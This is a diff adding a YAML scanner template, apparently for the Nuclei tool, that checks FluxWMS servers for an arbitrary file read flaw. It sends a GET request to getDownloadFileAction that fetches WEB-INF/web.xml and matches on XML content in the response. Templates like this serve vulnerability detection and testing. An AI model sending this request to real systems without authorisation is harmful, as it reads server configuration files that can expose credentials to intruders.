@@ -1,0 +1,25 @@
+id: FluxWMS-getDownloadFileAction-ReadAnyFile
+
+info:
+  name: FluxWMS-getDownloadFileAction-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    FluxWMS-getDownloadFileAction-ReadAnyFile
+
+http:
+  - raw:
+      - |
+        GET /a00webres/getDownloadFileAction?dowmLoadUrl=WEB-INF/web.xml&fileName=web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<?xml version=\"1.0\""
+          - "<filter-name>"
+        condition: and
